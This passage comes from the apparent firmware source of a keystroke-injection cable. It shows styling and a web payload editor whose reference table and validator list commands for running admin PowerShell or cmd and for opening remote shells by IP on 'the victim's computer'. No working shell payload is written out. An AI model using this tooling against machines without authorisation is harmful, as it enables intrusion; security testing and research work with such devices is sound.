}\n}\n\n.payload-list-container {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));\n  gap: 15px; /* Increased gap */\n  margin: 15px 0;\n  position: relative;\n  z-index: 1;\n}\n\n.button-container button, .button-container-os button {\n  width: 100%;\n}\n\n.stat-group {\n  flex: 1 1 100%;\n}\n\n#validationStatus {\n    font-size: 0.7em;  /* Reduced font size from 0.8em to 0.7em */\n    margin-left: 10px;\n    display: inline-block;\n    vertical-align: middle;\n}\n\n@media (max-width: 480px) {\n    #validationStatus {\n        font-size: 0.6em;  /* Even smaller on mobile */\n    }\n}\n\n.validation-ok {\n    color: var(--success);\n}\n\n.validation-error {\n    color: var(--error);\n}\n\n.payload-editor-container {\n    display: flex;\n    position: relative;\n    height: 20em;\n    background-color: rgba(10, 10, 10, 0.9);\n    border: 1px solid var(--primary);\n    border-radius: 3px;\n    overflow: hidden;\n}\n\n.payload-editor-container {\n    display: flex;\n    position: relative;\n    height: 20em;\n    background-color: rgba(10, 10, 10, 0.9);\n    border: 1px solid var(--primary);\n    border-radius: 3px;\n    overflow: hidden;\n}\n\n.line-numbers {\n    width: 30px;\n    padding: 12px 5px 12px 10px;\n    background-color: rgba(5, 5, 8, 0.7);\n    color: #666;\n    font-family: 'Courier New', monospace;\n    font-size: 0.8em;\n    text-align: right;\n    user-select: none;\n    overflow-y: scroll;\n    -ms-overflow-style: none;\n    scrollbar-width: none;\n    border: none;\n    line-height: 22px;\n    height: 100%;\n    box-sizing: border-box;\n}\n\n#livePayloadInput {\n    flex: 1;\n    border: none;\n    border-radius: 0 3px 3px 0;\n    padding: 12px;\n    background-color: transparent;\n    color: var(--secondary);\n    line-height: 22px;\n    resize: none;\n    white-space: pre;\n    overflow-x: auto;\n    overflow-y: auto;\n    height: 100%;\n    box-sizing: border-box;\n    font-family: 'Courier New', monospace;\n    font-size: 0.95em;\n}\n\n/* Mobile styles remain exactly the same */\n@media (max-width: 768px) {\n    .payload-editor-container {\n        height: 15em;\n    }\n    \n    .line-numbers, #livePayloadInput {\n        font-size: 14px;\n        line-height: 1.4em;\n    }\n    \n    .line-numbers {\n        width: 25px;\n        padding: 12px 3px 8px 5px;\n    }\n}\n\n.line-numbers::-webkit-scrollbar {\n    display: none;\n}\n\n.autocomplete-suggestion {\n    position: absolute;\n    color: var(--primary);\n    pointer-events: none;\n    font-family: 'Courier New', monospace;\n    background-color: rgba(0, 0, 0, 0.9);\n    padding: 2px 6px;\n    border-radius: 3px;\n    border: 1px solid var(--secondary);\n    box-shadow: 0 0 5px rgba(0, 242, 255, 0.5);\n    z-index: 1000;\n    white-space: pre;\n    font-weight: bold;\n}\n\n/* Command Reference Styles */\n.command-reference, .keys-reference {\n    background: rgba(10, 10, 18, 0.8);\n    border: 1px solid var(--primary);\n    border-radius: 5px;\n    margin: 20px 0;\n    overflow: hidden;\n}\n\n.command-reference-toggle, .keys-reference-toggle {\n    padding: 15px;\n    cursor: pointer;\n    background: rgba(0, 0, 0, 0.3);\n    color: var(--primary);\n    font-weight: bold;\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n}\n\n.command-reference-toggle:hover, .keys-reference-toggle:hover {\n    background: rgba(0, 242, 255, 0.1);\n}\n\n.command-table-container, .keys-table-container {\n    padding: 0 15px 15px;\n    max-height: 300px;\n    overflow-y: auto;\n}\n\n/* OS selector*/\n.styled-select {\n  background-color: rgba(10, 10, 10, 0.9); /* igual que tu .view-container */\n  border: 1px solid var(--primary);\n  color: var(--light);\n  padding: 8px 12px;\n  border-radius: 3px;\n  width: 100%;\n  font-family: 'Courier New', monospace;\n  font-size: 16px;\n  margin-bottom: 12px;\n  transition: all 0.3s;\n  box-sizing: border-box;\n\n  /* Eliminar apariencia nativa */\n  appearance: none;\n  -webkit-appearance: none;\n  -moz-appearance: none;\n\n  /* \ufffd\ufffdcono de flecha */\n  background-image: url(\"data:image/svg+xml,%3Csvg fill='%2300f2ff' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E\");\n  background-repeat: no-repeat;\n  background-position: right 12px center;\n  background-size: 16px 16px;\n  padding-right: 36px; /* Espacio para flecha */\n}\n\n.styled-select:focus {\n  outline: none;\n  border-color: var(--secondary);\n  box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);\n}\n\n.section-header {\n  font-size: 1.2em;\n  color: var(--primary);\n  margin: 20px 0 10px 0;\n  padding-bottom: 5px;\n  border-bottom: none;\n  position: relative;\n  text-transform: uppercase;\n  letter-spacing: 1px;\n  font-weight: bold;\n}\n\n.section-header::after {\n  content: '';\n  position: absolute;\n  bottom: 0;\n  left: 0;\n  width: 100%;\n  height: 1px;\n  background: linear-gradient(90deg, transparent, var(--primary), transparent);\n}\n\n.page-loading::before {\n    content: \"\";\n    position: fixed;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n    background: rgba(5, 5, 8, 0.9);\n    z-index: 9999;\n}\n\n.page-loading::after {\n    content: \"LOADING...\";\n    position: fixed;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    color: var(--primary);\n    font-family: 'Courier New', monospace;\n    font-size: 1.2em;\n    font-weight: bold;\n    text-transform: uppercase;\n    letter-spacing: 2px;\n    text-shadow: 0 0 8px var(--primary);\n    z-index: 10000;\n    animation: pulse 1.5s infinite alternate;\n}\n\n@keyframes pulse {\n    from { opacity: 0.7; text-shadow: 0 0 5px var(--primary); }\n    to { opacity: 1; text-shadow: 0 0 15px var(--primary), 0 0 20px var(--secondary); }\n}\n)=====\";"
    },
    {
      "name": "livepayload.h",
      "content": "const char LivePayload[] PROGMEM = R\"=====(\n<!DOCTYPE HTML>\n<html>\n<head>\n    <title>EvilCrowCable-Wind - Payload Editor</title>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n    <meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\">\n    <link rel=\"stylesheet\" href=\"style.css\">\n    <script src=\"javascript.js\"></script>\n</head>\n<body>\n    <div id=\"global-toast\" class=\"toast-container\"></div>\n    <nav id='menu'>\n        <input type='checkbox' id='responsive-menu'><label for='responsive-menu'></label>\n        <ul>\n            <li><a href='/'>Home</a></li>\n            <li><a href='/livepayload'>Payload Editor</a></li>\n            <li><a href='/uploadpayload'>Upload Payload</a></li>\n            <li><a href='/listpayloads'>List Payloads</a></li>\n            <li><a href='/autoexecplanning'>AutoExec Planning</a></li>\n            <li><a href='/config'>Config</a></li>\n        </ul>\n    </nav>\n\n    <div class=\"cable-wind-logo\">PAYLOAD EDITOR</div>\n\n    <div class=\"view-container\">\n        <div class=\"form-group\">\n            <div class=\"validation-container\">\n                <span id=\"validationStatus\"></span>\n            </div>\n            <div class=\"payload-editor-container\">\n                <div id=\"lineNumbers\" class=\"line-numbers\"></div>\n                <textarea id=\"livePayloadInput\" class=\"terminal-style\" name=\"livepayload\" spellcheck=\"false\"></textarea>\n            </div>\n        </div>\n\n        <div class=\"button-container\">\n            <button type=\"button\" onclick=\"runPayload()\">Run Payload</button>\n            <button type=\"button\" onclick=\"showSavePayloadForm()\">Save Payload</button>\n        </div>\n\n        <!-- Hidden metadata form that appears when saving -->\n        <div id=\"metadataForm\" style=\"display: none;\">\n            <div class=\"form-group\">\n                <label for=\"payloadName\">Payload Name:</label>\n                <input type=\"text\" id=\"payloadName\" name=\"payloadName\" placeholder=\"Enter a descriptive name\" class=\"terminal-style\">\n            </div>\n            <div class=\"form-group\">\n                <label for=\"payloadDescription\">Description:</label>\n                <textarea id=\"payloadDescription\" name=\"payloadDescription\" placeholder=\"Enter a brief description\" rows=\"3\" class=\"terminal-style\"></textarea>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"payloadOS\">Target OS:</label>\n                <select id=\"payloadOS\" class=\"styled-select\" name=\"payloadOS\" required>\n                  <option value=\"unknown\">Select OS</option>\n                  <option value=\"windows\">Windows</option>\n                  <option value=\"linux\">Linux</option>\n                  <option value=\"android\">Android</option>\n                  <option value=\"macos\">macOS</option>\n                  <option value=\"ios\">iOS</option>\n                </select>\n            </div>\n            <div class=\"button-container\">\n                <button type=\"button\" onclick=\"confirmSavePayload()\">Confirm Save</button>\n                <button type=\"button\" onclick=\"cancelSavePayload()\" style=\"background: linear-gradient(135deg, var(--error), #cc0022);\">Cancel</button>\n            </div>\n        </div>\n\n        <div class=\"command-reference\">\n            <div class=\"command-reference-toggle\" onclick=\"toggleSection(this)\">\n                <span>Syntax Reference</span>\n                <span>\ufffd\ufffd\ufffd</span>\n            </div>\n            <div class=\"command-table-container\" style=\"display: none;\">\n                <table class=\"command-table\">\n                    <thead>\n                        <tr>\n                            <th>Command</th>\n                            <th>Example</th>\n                            <th>Description</th>\n                        </tr>\n                    </thead>\n                    <tbody>\n                        <tr><td class=\"command-cell\"># Layout:</td><td># Layout: EN_US</td><td>Set keyboard layout for the payload. Must be the first line.</td></tr>\n                        <tr><td class=\"command-cell\">ServerConnect</td><td>ServerConnect IP</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">DetectOS</td><td>DetectOS</td><td>Detect the operating system</td></tr>\n                        <tr><td class=\"command-cell\">RunWin</td><td>RunWin cmd</td><td>Runs a command or a program on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">RunPowershellAdmin</td><td>RunPowershellAdmin</td><td>Run powershell as administrator</td></tr>\n                        <tr><td class=\"command-cell\">RunCmdAdmin</td><td>RunCmdAdmin</td><td>Run cmd as administrator</td></tr>\n                        <tr><td class=\"command-cell\">ShellWin</td><td>ShellWin IP</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">RunNix</td><td>RunNix getit</td><td>Runs a command or a program on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">RunLauncher</td><td>RunLauncher Libreoffice</td><td>Runs a command or a program on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">CtrlAltT</td><td>CtrlAltT</td><td>Run a terminal on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">ShellNix</td><td>ShellNix IP</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">ShellMac</td><td>ShellMac IP</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">ShellMacCleanup</td><td>ShellMacCleanup</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">RunMac</td><td>RunMac terminal</td><td>Runs a command or a program on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">GuiR</td><td>GuiR</td><td>Press WINDOWS+R on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">Gui</td><td>Gui</td><td>Press WINDOWS on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">AltF2</td><td>AltF2</td><td>Press ALT+F2 on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">GuiSpace</td><td>GuiSpace</td><td>Press WINDOWS+SPACE on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">Print</td><td>Print Hello World!</td><td>Prints a text on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">WinPrint</td><td>WinPrint Hello World!</td><td>Print a text on the victim's computer without knowing the layout (Windows only)</td></tr>\n                        <tr><td class=\"command-cell\">PrintLine</td><td>PrintLine Hello World!</td><td>Prints a text and presses the ENTER key on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">WinPrintLine</td><td>WinPrintLine Hello World!</td><td>Prints a text and presses the ENTER key on the victim's computer without knowing the layout (Windows only)</td></tr>\n                        <tr><td class=\"command-cell\">Delay</td><td>Delay 5000</td><td>Delay in ms</td></tr>\n                        <tr><td class=\"command-cell\">Press</td><td>Press KEY_ENTER</td><td>Press a key or modifier on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">PressRelease</td><td>PressRelease KEY_ENTER</td><td>Press and Release a key or modifier on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">Release</td><td>Release</td><td>Release all pressed keys</td></tr>\n                    </tbody>\n                </table>\n            </div>\n        </div>\n\n        <div class=\"keys-reference\">\n            <div class=\"keys-reference-toggle\" onclick=\"toggleSection(this)\">\n                <span>Keys and Modifiers Syntax</span>\n                <span>\ufffd\ufffd\ufffd</span>\n            </div>\n            <div class=\"keys-table-container\" style=\"display: none;\">\n                <table class=\"command-table\">\n                    <thead>\n                        <tr>\n                            <th>Keys and Modifiers - Press</th>\n                            <th>Keys - PressRelease</th>\n                        </tr>\n                    </thead>\n                    <tbody>\n                        <tr><td>a - Z, 0 - 9, Special characters</td><td>Example: Press a or PressRelease a</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_ALT</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_GUI</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_CTRL</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_SHIFT</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_ALT</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_GUI</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_CTRL</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_SHIFT</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_ENTER</td><td class=\"command-cell\">PressRelease KEY_ENTER</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_UP_ARROW</td><td class=\"command-cell\">PressRelease KEY_UP_ARROW</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_DOWN_ARROW</td><td class=\"command-cell\">PressRelease KEY_DOWN_ARROW</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_ARROW</td><td class=\"command-cell\">PressRelease KEY_LEFT_ARROW</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_ARROW</td><td class=\"command-cell\">PressRelease KEY_RIGHT_ARROW</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_BACKSPACE</td><td class=\"command-cell\">PressRelease KEY_BACKSPACE</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_TAB</td><td class=\"command-cell\">PressRelease KEY_TAB</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_PAUSE</td><td class=\"command-cell\">PressRelease KEY_PAUSE</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_INSERT</td><td class=\"command-cell\">PressRelease KEY_INSERT</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_DELETE</td><td class=\"command-cell\">PressRelease KEY_DELETE</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_PAGE_UP</td><td class=\"command-cell\">PressRelease KEY_PAGE_UP</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_PAGE_DOWN</td><td class=\"command-cell\">PressRelease KEY_PAGE_DOWN</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_ESC</td><td class=\"command-cell\">PressRelease KEY_ESC</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_SPACE</td><td class=\"command-cell\">PressRelease KEY_SPACE</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_HOME</td><td class=\"command-cell\">PressRelease KEY_HOME</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_END</td><td class=\"command-cell\">PressRelease KEY_END</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_CAPS_LOCK</td><td class=\"command-cell\">PressRelease KEY_CAPS_LOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_PRINT_SCREEN</td><td class=\"command-cell\">PressRelease KEY_PRINT_SCREEN</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_SCROLL_LOCK</td><td class=\"command-cell\">PressRelease KEY_SCROLL_LOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_NUM_LOCK</td><td class=\"command-cell\">PressRelease KEY_NUM_LOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_MENU</td><td class=\"command-cell\">PressRelease KEY_MENU</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_NUMLOCK</td><td class=\"command-cell\">PressRelease LED_NUMLOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_CAPSLOCK</td><td class=\"command-cell\">PressRelease LED_CAPSLOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_SCROLLLOCK</td><td class=\"command-cell\">PressRelease LED_SCROLLLOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_COMPOSE</td><td class=\"command-cell\">PressRelease LED_COMPOSE</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_KANA</td><td class=\"command-cell\">PressRelease LED_KANA</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F1</td><td class=\"command-cell\">PressRelease KEY_F1</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F2</td><td class=\"command-cell\">PressRelease KEY_F2</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F3</td><td class=\"command-cell\">PressRelease KEY_F3</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F4</td><td class=\"command-cell\">PressRelease KEY_F4</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F5</td><td class=\"command-cell\">PressRelease KEY_F5</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F6</td><td class=\"command-cell\">PressRelease KEY_F6</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F7</td><td class=\"command-cell\">PressRelease KEY_F7</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F8</td><td class=\"command-cell\">PressRelease KEY_F8</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F9</td><td class=\"command-cell\">PressRelease KEY_F9</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F10</td><td class=\"command-cell\">PressRelease KEY_F10</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F11</td><td class=\"command-cell\">PressRelease KEY_F11</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F12</td><td class=\"command-cell\">PressRelease KEY_F12</td></tr>\n                    </tbody>\n                </table>\n            </div>\n        </div>\n    </div>\n\n    <script>\n        // Global variables for autocomplete\n        let commandSuggestions = {};\n        let currentSuggestion = null;\n        let suggestionElement = null;\n        \n        // Global commands list\n        const commands = [\n            // Special configuration commands\n            '# Layout:',  // Special command for keyboard layout configuration\n            // Main commands\n            'ServerConnect',\n            'DetectOS',\n            'RunWin',\n            'RunPowershellAdmin',\n            'RunCmdAdmin',\n            'ShellWin',\n            'RunNix',\n            'RunLauncher',\n            'CtrlAltT',\n            'ShellNix',\n            'ShellMac',\n            'ShellMacCleanup',\n            'RunMac',\n            'GuiR',\n            'Gui',\n            'AltF2',\n            'GuiSpace',\n            'Print',\n            'WinPrint',\n            'PrintLine',\n            'WinPrintLine',\n            'Delay',\n            'Press',\n            'PressRelease',\n            'Release',\n            // Key constants for Press/PressRelease\n            'KEY_LEFT_ALT',\n            'KEY_LEFT_GUI',\n            'KEY_LEFT_CTRL',\n            'KEY_LEFT_SHIFT',\n            'KEY_RIGHT_ALT',\n            'KEY_RIGHT_GUI',\n            'KEY_RIGHT_CTRL',\n            'KEY_RIGHT_SHIFT',\n            'KEY_ENTER',\n            'KEY_UP_ARROW',\n            'KEY_DOWN_ARROW',\n            'KEY_LEFT_ARROW',\n            'KEY_RIGHT_ARROW',\n            'KEY_BACKSPACE',\n            'KEY_TAB',\n            'KEY_PAUSE',\n            'KEY_INSERT',\n            'KEY_DELETE',\n            'KEY_PAGE_UP',\n            'KEY_PAGE_DOWN',\n            'KEY_ESC',\n            'KEY_SPACE',\n            'KEY_HOME',\n            'KEY_END',\n            'KEY_CAPS_LOCK',\n            'KEY_PRINT_SCREEN',\n            'KEY_SCROLL_LOCK',\n            'KEY_NUM_LOCK',\n            'KEY_MENU',\n            'LED_NUMLOCK',\n            'LED_CAPSLOCK',\n            'LED_SCROLLLOCK',\n            'LED_COMPOSE',\n            'LED_KANA',\n            'KEY_F1',\n            'KEY_F2',\n            'KEY_F3',\n            'KEY_F4',\n            'KEY_F5',\n            'KEY_F6',\n            'KEY_F7',\n            'KEY_F8',\n            'KEY_F9',\n            'KEY_F10',\n            'KEY_F11',\n            'KEY_F12'\n        ];\n        \n        // Generate suggestions on load\n        commandSuggestions = generateCommandSuggestions(commands);\n        \n        // Toggle section visibility\n        function toggleSection(element) {\n            const container = element.parentElement;\n            const content = container.querySelector('.command-table-container, .keys-table-container');\n            const arrow = element.querySelector('span:last-child');\n            \n            if (content.style.display === 'none') {\n                content.style.display = 'block';\n                arrow.textContent = '\ufffd\ufffd\ufffd';\n            } else {\n                content.style.display = 'none';\n                arrow.textContent = '\ufffd\ufffd\ufffd';\n            }\n        }\n\n        let toggleIntervals = {};\n\n        function validatePayload() {\n            const payloadInput = document.getElementById('livePayloadInput');\n            const validationStatus = document.getElementById('validationStatus');\n            const text = payloadInput.value.trim(); // Get trimmed content first\n\n            // Clear previous validation\n            validationStatus.className = '';\n            validationStatus.textContent = '';\n            validationStatus.title = '';\n\n            // Check for empty payload (primary check)\n            if (text === '') {\n                validationStatus.className = 'validation-empty validation-text';\n                validationStatus.textContent = 'Empty payload';\n                return; // Exit early if empty\n            }\n\n            // Only proceed with line validation if there's content\n            const lines = text.split('\\n');\n            let errors = [];\n\n            lines.forEach((line, index) => {\n                line = line.trim();\n                if (!line) return; // Skip empty lines\n\n                const parts = line.split(/\\s+/);\n                const command = parts[0];\n                const args = parts.slice(1).join(' ');\n\n                const validationResult = isValidCommand(command, args, index + 1);\n                if (!validationResult.valid) {\n                    errors.push(`Line ${index + 1}: ${validationResult.message}`);\n                }\n            });\n\n            // Display validation results\n            if (errors.length > 0) {\n                validationStatus.className = 'validation-error validation-text';\n                validationStatus.textContent = errors.join('\\n');\n                validationStatus.title = errors.join('\\n');\n            } else {\n                validationStatus.className = 'validation-ok validation-text';\n                validationStatus.textContent = 'All commands are valid';\n            }\n        }\n\n        function isValidCommand(command, args, lineNumber) {\n            // Enhanced command validation with specific rules\n            const commandRules = {\n                '# Layout:': {\n                    validate: args => {\n                        // Valid layouts from firmware.ino\n                        const validLayouts = [\n                            'EN_US', 'ES_ES', 'FR_FR', 'IT_IT', 'DA_DK', \n                            'DE_DE', 'HR_HR', 'HU_HU', 'PT_PT', 'PT_BR', \n                            'BE_BE', 'BR_BR', 'CA_CA', 'CA_FR', 'SK_SK', \n                            'CZ_CZ', 'SV_SE', 'SI_SI'\n                        ];\n                        return validLayouts.includes(args.trim());\n                    },\n                    message: 'requires valid keyboard layout code (e.g., EN_US, SI_SI)'\n                },\n                'ServerConnect': {\n                    validate: args => args.length > 0,\n                    message: 'requires IP address/hostname'\n                },\n                'DetectOS': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'RunWin': {\n                    validate: args => args.length > 0,\n                    message: 'requires command to run'\n                },\n                'RunPowershellAdmin': {\n                    validate: args => true, // Can have optional arguments\n                    message: 'optional: command to run'\n                },\n                'RunCmdAdmin': {\n                    validate: args => true, // Can have optional arguments\n                    message: 'optional: command to run'\n                },\n                'ShellWin': {\n                    validate: args => args.length > 0,\n                    message: 'requires IP address'\n                },\n                'RunNix': {\n                    validate: args => args.length > 0,\n                    message: 'requires command to run'\n                },\n                'RunLauncher': {\n                    validate: args => args.length > 0,\n                    message: 'requires application name'\n                },\n                'CtrlAltT': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'ShellNix': {\n                    validate: args => args.length > 0,\n                    message: 'requires IP address'\n                },\n                'ShellMac': {\n                    validate: args => args.length > 0,\n                    message: 'requires IP address'\n                },\n                'ShellMacCleanup': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'RunMac': {\n                    validate: args => args.length > 0,\n                    message: 'requires command or application name'\n                },\n                'GuiR': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'Gui': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'AltF2': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'GuiSpace': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'Print': {\n                    validate: args => args.length > 0,\n                    message: 'requires text to print'\n                },\n                'WinPrint': {\n                    validate: args => args.length > 0,\n                    message: 'requires text to print'\n                },\n                'PrintLine': {\n                    validate: args => args.length > 0,\n                    message: 'requires text to print'\n                },\n                'WinPrintLine': {\n                    validate: args => args.length > 0,\n                    message: 'requires text to print'\n                },\n                'Delay': {\n                    validate: args => {\n                        const num = parseInt(args);\n                        return args.trim() !== '' && !isNaN(num) && num > 0;\n                    },\n                    message: 'requires positive number (milliseconds)'\n                },\n                'Press': {\n                    validate: isValidKey,\n                    message: 'requires valid key name'\n                },\n                'PressRelease': {\n                    validate: isValidKey,\n                    message: 'requires valid key name'\n                },\n                'Release': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                // Key constants don't need validation as they're used as arguments to Press/PressRelease\n                'KEY_LEFT_ALT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_LEFT_GUI': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_LEFT_CTRL': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_LEFT_SHIFT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_ALT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_GUI': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_CTRL': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_SHIFT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_ENTER': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_UP_ARROW': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_DOWN_ARROW': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_LEFT_ARROW': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_ARROW': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_BACKSPACE': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_TAB': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_PAUSE': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_INSERT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_DELETE': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_PAGE_UP': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_PAGE_DOWN': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_ESC': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_SPACE': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_HOME': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_END': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_CAPS_LOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_PRINT_SCREEN': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_SCROLL_LOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_NUM_LOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_MENU': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_NUMLOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_CAPSLOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_SCROLLLOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_COMPOSE': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_KANA': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F1': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F2': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F3': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F4': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F5': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F6': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F7': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F8': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F9': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F10': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F11': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F12': { validate: args => false, message: 'not a command but a key parameter' }\n            };\n\n            // Handle empty lines or commands\n            if (!command || command === '') {\n                return { valid: true }; // Empty lines are valid (allows for comments or spacing)\n            }\n\n            // Check if the command exists in our rules\n            if (!commandRules[command]) {\n                return { valid: false, message: `Unknown command \"${command}\"` };\n            }\n\n            const validation = commandRules[command];\n            if (!validation.validate(args)) {\n                return { valid: false, message: `${command} ${validation.message}` };\n            }\n\n            return { valid: true };\n        }\n\n        function isValidKey(key) {\n            // Trim whitespace and convert to uppercase for consistent comparison\n            key = key.trim().toUpperCase();\n\n            // Check if it's a single printable character (not control characters)\n            if (key.length === 1 && key.charCodeAt(0) >= 32 && key.charCodeAt(0) <= 126) {\n                return true;\n            }\n\n            // Check against our master commands list (already contains all KEY_* constants)\n            return commands.some(cmd => \n                cmd.toUpperCase() === key && \n                (cmd.startsWith('KEY_') || 